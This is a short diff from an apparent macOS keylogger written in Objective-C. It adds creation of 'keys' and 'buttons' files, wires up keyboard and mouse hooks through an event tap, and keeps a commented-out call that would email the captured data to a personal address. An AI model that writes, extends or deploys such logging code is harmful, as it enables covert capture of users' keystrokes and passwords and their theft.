@@ -21,6 +21,9 @@ CGEventRef myCGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef
 - (void)viewDidLoad {
     [super viewDidLoad];
     
+    [FileManager createFile:@"keys"];
+    [FileManager createFile:@"buttons"];
+    
     _key = [[KeyHooker alloc] init];
     _mouse = [[MouseHooker alloc] init];
     
@@ -28,7 +31,6 @@ CGEventRef myCGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef
     [_mouse setMouseNotifications];
     
     //[EmailSender sendEmailWithMail:@"i.suprynovic@gmail.com" withSubject:@"Hello" Attachments:nil];
-    NSLog(@"%llu", [FileManager getFileSize:@"keys"]);
 }
 
 @end
